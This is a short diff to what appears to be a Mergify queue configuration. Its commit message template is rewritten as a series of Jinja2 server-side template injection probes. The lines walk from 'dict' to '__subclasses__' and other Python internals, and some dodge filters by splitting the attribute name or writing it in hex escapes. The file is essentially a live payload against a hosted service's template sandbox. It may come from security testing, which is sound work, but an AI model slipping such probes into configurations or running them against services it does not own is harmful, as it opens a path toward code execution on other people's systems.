@@ -4,11 +4,12 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      SSTI: {{ 7*7 }}
-      SC_ON_DICT: {{ [dict]|map(attribute="__subclasses__")|list }}
-      INITSUB_DICT: {{ [dict]|map(attribute="__init_subclass__")|list }}
-      REDUCE_DICT: {{ [dict]|map(attribute="__reduce__")|list }}
-      DIR_CLASS: {{ dict['__class__'] }}
+      S1_AUTO: {{ dict['__subclasses__'] }}
+      S2_COUNT: {{ dict['__subclasses__']()|length }}
+      S3_FIRST: {{ dict['__subclasses__']()[0] }}
+      S4_CAT_CALL: {{ dict['__subcla'~'sses__']()|length }}
+      S5_HEX_CALL: {{ dict['\x5f\x5fsubclasses\x5f\x5f']()|length }}
+      S6_FIRST_NAME: {{ dict['__subclasses__']()[0]['__name__'] }}
 pull_request_rules:
   - name: q
     conditions:
